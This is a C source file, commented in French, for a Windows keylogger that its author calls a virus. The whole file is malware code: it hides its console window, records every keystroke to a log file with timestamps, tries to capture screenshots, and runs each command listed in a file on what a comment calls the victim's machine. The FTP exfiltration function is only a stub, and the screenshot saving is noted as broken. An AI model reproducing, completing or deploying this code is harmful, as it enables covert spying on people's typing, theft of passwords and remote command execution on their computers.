#include <Windows.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>



/*
editeur : COTE CELESTE

 liste toute les touches presser pendant 20 sec puis prend un screen ( a finir)
 il faut decoder les touches apres
 a chaque commencement met la date et l'heure sur le fichier ( faut rajouter dautre info)
 il exectute tout les commande du fichier commande.ordre et note les commande executer

 !!!!!!!! a revoir la fonction screenshot qui enregistre pas les image

*/


/*
pour compilation

gcc main.c -o virus1_1_1.exe -lgdi32
*/



#define visible // (visible / invisible)
#define FILE_NAME "test.log" //name of the file where all the touch will go write
#define COMMANDE_FILE "commande.ordre" // name of the file where is all the ordre 
void pause(); //just a infinity boucle
void getKey(); //fonction to get all the key and write this in a file
void sendData(); //fonction to send the file with the keystroke
void screenshot(); //fonction to screenshot (no finish)
void SaveBMP(HDC *BmpMemory, char* BmpName,DWORD FileSize);//work with screen
void getUserInfo();//fonction to get the USER information like date hours maybe put more infos
void ordre();//fonction to exectute ordre save in a file


int etatOrdi = 1;//useless for the moment


void main ()
{
	FreeConsole(); //to hide the windows
	
	int i = 0;
	int j = 0;
	while(1){
		for(i=0; i<50; i++ ){ //do this 30 time
			getUserInfo(); //write the date
			
			for(j=0;j<100; j++){
				getKey();//save all the key stroke      c'est c'est éé&"'(-èè_&é&é'''412356123"
			}

			screenshot();//and screen
		}
		
			
		sendData();//send the data
		ordre();//and execute ordre if there is ordre
	}
		
	
}

void getKey(){ // foction pour choper et ecrire tout les lettres taper
	int i=0, j=0, k=0;
	FILE *fichier;
	while(i<550){ // on le bordel 500 fois pour que sa dure 25 sec environ        
		j=1;
		while(j<250){
			for(k=0; k<50; k++, j++ ){
				if (GetAsyncKeyState(j) == -32767)  // si la touche tester est appuyer commade pour choper les touches
				{
					fichier=fopen(FILE_NAME, "a"); // on ouvre le fichier en mode ajout
					
						fprintf(fichier, "%d ", j);
					
					fclose(fichier); //et on ferme le fichier
				}
			}
			//Sleep(1); // on lui laisse un peu de repos tout les 50 passages
		}

		i++;
	}


}


//recupere les ordres pour les executer sur la machine de la victime
void ordre() {
	FILE *fichier;
	FILE *fichier_OUT;

	fichier =fopen(COMMANDE_FILE, "r");
	fichier_OUT= fopen(FILE_NAME, "a");
	int nombre = 300;

	if(fichier != NULL || fichier_OUT != NULL){
		char chaine[1000] = "";
			while (fgets(chaine, 1000, fichier) != NULL) // On lit le fichier tant qu'on ne reçoit pas d'erreur (NULL)
			{

				system(chaine);
				fprintf(fichier_OUT, "\n %d %s \n", nombre, chaine);

			}		

			fclose(fichier);
			fclose(fichier_OUT);
			//system("DEL commande.ordre");


	}

}

//fonction  pour ecrire sur le fichier tout les indication date user...
void getUserInfo(){
	int nombre = 300;
	FILE *fichier = fopen(FILE_NAME, "a");
	SYSTEMTIME  date;
	GetSystemTime(&date);
	fprintf(fichier, "\n %d enregistement a : %02d:%02d le %02d / %02d \n", nombre, date.wHour, date.wMinute, date.wDay, date.wMonth);
	fclose(fichier);

}


void sendData(){
	/// faire un code pour envoyer le fichier en FTP 
}

void screenshot(){

	
	//pour prendre un screen de l'ecran
	//prendre un context du device compatible avec le device
  HDC hDc = CreateCompatibleDC(0);

  // cree dans la memoire un bitmap compatible avec le device et de 300 de cote. 
  // ici avec getDC on prend tout les parametre de tout l'ecran au lieu de prendre un HDC 
  HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), 300, 300);

  // selection dans la memoire du DC notre hbitmap
  SelectObject(hDc, hBmp);

  

  // alors la c'est plus complexe
  //dans l'ordre on donne l'indantifiant du DC destinataire, x et y du debut du rectangle de la destination
  //la longueur et largeur du rectangle dans le quel on va put le truc, la chose que l'on veut copier
  //ici c'est l'ecran entier (mais c'est toujours un identifiant d'un DC), x et y de en haut a droit 
  //du rectangle de la source, et la technique de copie ici on copie directement
  BitBlt(hDc, 0, 0, 300, 300, GetDC(0), 400, 300, SRCCOPY);

	
	SaveBMP(&hDc, "test.bmp", sizeof(HDC));
  //GetObject();

  // free the bitmap memory
  DeleteObject(hBmp);

  

}


/// pour sauvegarder la variable bitmap en fichier
void SaveBMP(HDC *BmpMemory, char* BmpName,DWORD FileSize)
{
    DWORD Junk;
    HANDLE FH = CreateFileA(BmpName,GENERIC_WRITE,FILE_SHARE_WRITE,0,CREATE_ALWAYS,0,0);
    WriteFile(FH,BmpMemory,FileSize,&Junk,0);       // Ecriture disque du Buffer mémoire
    CloseHandle(FH);
    GlobalFree(BmpMemory);                          // Libération Buffer
}






void pause(){
	while (1){

	}
}